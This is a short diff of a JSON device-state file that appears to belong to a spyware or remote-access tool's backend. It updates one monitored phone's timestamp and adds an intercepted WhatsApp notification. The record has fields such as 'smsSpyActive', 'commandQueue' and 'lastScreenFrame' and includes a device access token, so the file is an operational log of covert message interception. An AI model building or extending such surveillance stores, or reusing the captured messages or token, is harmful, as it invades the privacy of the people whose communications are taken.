@@ -1245,7 +1245,7 @@
     "deviceName": "HP-FREE-A487",
     "ownerUsername": "rian",
     "token": "77751522caef94e9c9f1117d03601776",
-    "lastSeen": 1775189169643,
+    "lastSeen": 1775189172735,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T03:51:21.437Z",
@@ -1261,6 +1261,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "GB¹||STOK AKUN BEBE STR",
+        "content": "‎27 pesan baru",
+        "time": "03/04 11:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189170490
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB¹||STOK AKUN BEBE STR (27 pesan): bebe",
